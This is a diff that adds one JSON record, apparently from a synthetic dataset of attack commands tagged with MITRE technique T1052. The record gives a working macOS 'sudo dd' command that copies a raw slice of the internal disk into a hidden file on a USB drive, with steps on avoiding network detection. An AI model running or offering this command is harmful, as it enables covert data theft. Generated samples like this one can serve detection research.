@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo dd if=/dev/rdisk0s1 of=/Volumes/USB/.cache.db bs=4m count=512",
+  "explanation": "Reads a raw slice of the internal disk and writes it into a hidden file on the external drive, facilitating offline data removal.",
+  "rationale_steps": [
+    "Access raw device to read data directly from the internal drive.",
+    "Write captured bytes to external media as a hidden file.",
+    "Operate entirely locally to avoid network detection.",
+    "Limit size via count to reduce write time and footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-887526a6",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
